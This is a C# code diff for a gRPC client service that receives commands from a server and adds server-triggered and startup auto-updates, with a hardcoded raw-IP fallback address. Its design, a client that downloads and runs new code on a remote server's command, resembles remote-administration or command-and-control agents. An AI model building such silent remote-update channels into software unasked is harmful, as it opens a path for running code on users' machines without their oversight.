@@ -106,6 +106,9 @@ public class GrpcClientService : BackgroundService
             _logger.LogInformation("Connected to server successfully. ClientId: {ClientId}", clientId);
         }
 
+        // Check for updates on startup
+        await CheckForUpdateOnStartupAsync(ct);
+
         // Start receiving messages in background
         var receiveTask = ReceiveMessagesAsync(ct);
 
@@ -171,10 +174,42 @@ public class GrpcClientService : BackgroundService
         _logger.LogDebug("Heartbeat sent");
     }
 
+    private async Task CheckForUpdateOnStartupAsync(CancellationToken ct)
+    {
+        try
+        {
+            _logger.LogInformation("Checking for updates on startup...");
+
+            if (_updateService != null)
+            {
+                var latestVersion = await _updateService.CheckForUpdateAsync();
+
+                if (latestVersion != null)
+                {
+                    _logger.LogInformation("Update available on startup: {Version}. Applying automatically...", latestVersion.Version);
+
+                    // Gracefully disconnect before updating
+                    await DisconnectGracefullyAsync();
+
+                    await _updateService.ApplyUpdateAsync(latestVersion);
+                    // ApplyUpdateAsync exits the process, so we won't reach here
+                }
+                else
+                {
+                    _logger.LogInformation("No updates available. Current version: {Version}", _updateService.CurrentVersion);
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            _logger.LogWarning(ex, "Startup update check failed, continuing normal operation");
+        }
+    }
+
     private async Task PeriodicUpdateCheckAsync(CancellationToken ct)
     {
-        // Wait a bit before first check to allow connection to stabilize
-        await Task.Delay(TimeSpan.FromMinutes(1), ct);
+        // Wait before first periodic check (startup check already done)
+        await Task.Delay(_updateCheckInterval, ct);
 
         while (!ct.IsCancellationRequested)
         {
@@ -189,6 +224,10 @@ public class GrpcClientService : BackgroundService
                     if (latestVersion != null)
                     {
                         _logger.LogInformation("Update available: {Version}. Applying automatically...", latestVersion.Version);
+
+                        // Gracefully disconnect before updating
+                        await DisconnectGracefullyAsync();
+
                         await _updateService.ApplyUpdateAsync(latestVersion);
                         // ApplyUpdateAsync exits the process, so we won't reach here
                     }
@@ -304,6 +343,16 @@ public class GrpcClientService : BackgroundService
 
                 case "update":
                     result = await HandleUpdateCommandAsync(command, ct);
+                    break;
+
+                case "update_available":
+                    result = await HandleUpdateAvailableAsync(command, ct);
+                    break;
+
+                case "server_shutdown":
+                    _logger.LogInformation("Server is shutting down: {Message}", command.CommandText);
+                    result.Success = true;
+                    result.Stdout = "Acknowledged server shutdown";
                     break;
 
                 default:
@@ -600,6 +649,84 @@ public class GrpcClientService : BackgroundService
         return TorGames.Client.VersionInfo.Version;
     }
 
+    private async Task<CommandResult> HandleUpdateAvailableAsync(Command command, CancellationToken ct)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            var newVersion = command.CommandText;
+            _logger.LogInformation("Received update_available notification for version {Version}", newVersion);
+
+            // Use existing update service or create new one
+            var updateService = _updateService;
+            if (updateService == null)
+            {
+                var serverApiUrl = _configuration["Server:ApiAddress"] ?? "http://144.91.111.101:5001";
+                updateService = new UpdateService(_logger, serverApiUrl);
+            }
+
+            // Check if we actually need to update
+            var latestVersion = await updateService.CheckForUpdateAsync();
+            if (latestVersion == null)
+            {
+                result.Success = true;
+                result.Stdout = $"Already on latest version: {updateService.CurrentVersion}";
+                _logger.LogInformation("No update needed, already on latest version");
+                return result;
+            }
+
+            result.Stdout = $"Update available: {latestVersion.Version}. Downloading and applying...";
+            _logger.LogInformation("Applying update to version {Version}", latestVersion.Version);
+
+            // Send result before applying (as we'll exit)
+            await SendCommandResultAsync(result, ct);
+
+            // Gracefully disconnect before updating
+            await DisconnectGracefullyAsync();
+
+            // This will exit the process
+            await updateService.ApplyUpdateAsync(latestVersion);
+
+            // Should never reach here
+            result.Success = true;
+            return result;
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = $"Update failed: {ex.Message}";
+            _logger.LogError(ex, "Update available command failed");
+            return result;
+        }
+    }
+
+    private async Task DisconnectGracefullyAsync()
+    {
+        try
+        {
+            _logger.LogInformation("Disconnecting gracefully before update...");
+
+            // Complete the request stream to signal we're done
+            if (_call != null)
+            {
+                await _call.RequestStream.CompleteAsync();
+                _logger.LogDebug("Request stream completed");
+            }
+
+            // Give the server a moment to process the disconnect
+            await Task.Delay(500);
+
+            // Clean up the connection
+            Cleanup();
+            _logger.LogInformation("Graceful disconnect completed");
+        }
+        catch (Exception ex)
+        {
+            _logger.LogWarning(ex, "Error during graceful disconnect (continuing with update)");
+        }
+    }
+
     private async Task<CommandResult> HandleUpdateCommandAsync(Command command, CancellationToken ct)
     {
         var result = new CommandResult { CommandId = command.CommandId };
@@ -633,6 +760,9 @@ public class GrpcClientService : BackgroundService
 
             // Send result before applying (as we'll exit)
             await SendCommandResultAsync(result, ct);
+
+            // Gracefully disconnect before updating
+            await DisconnectGracefullyAsync();
 
             // This will exit the process
             await updateService.ApplyUpdateAsync(latestVersion);
